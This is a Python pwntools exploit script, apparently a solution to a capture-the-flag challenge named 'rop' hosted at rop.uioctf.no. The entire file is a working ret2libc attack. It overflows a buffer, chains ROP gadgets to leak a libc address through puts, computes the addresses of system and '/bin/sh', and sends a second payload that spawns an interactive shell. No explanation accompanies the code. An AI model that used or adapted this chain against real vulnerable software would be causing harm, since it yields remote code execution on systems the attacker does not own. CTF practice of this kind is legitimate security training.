from pwn import *

context.binary = ELF('rop')
#context.terminal = ['xterm', '-e', 'sh', '-c']


libc = ELF('libc.so.6')

elf = ELF('./rop')
rop = ROP(elf)

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

print PUTS, MAIN, LIBC_START_MAIN, POP_RDI, RET


debug = True
#debug=False

if debug:
    r = process(context.binary.path)
    gdb.attach(r)
else:
    r = remote('rop.uioctf.no',6002)


def rop(length, data, r):
    r.sendline("1")
    print r.readuntil("?")
    r.sendline("{}".format(length))
    print r.readuntil("Go:")
    r.sendline("{}".format(data))
    print r.readuntil(">")



r.readuntil(">")


payload = "A" *48 + "B" * 8
payload += p64(POP_RDI)
payload += p64(LIBC_START_MAIN)
payload += p64(PUTS)
payload += p64(MAIN)


rop(1000, payload, r)

r.sendline("2")
print r.recvline()
leak = u64(r.recvline().strip().ljust(8, "\x00"))
print("Leaked: {}".format(leak))
print r.recvuntil(">")


libc.address = leak - libc.sym['__libc_start_main']
binsh = next(libc.search("/bin/sh"))
system = libc.sym["system"]
print binsh, system


payload = "A" * 48 + "B" * 8
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(system)

rop(1000, payload, r)

r.interactive()
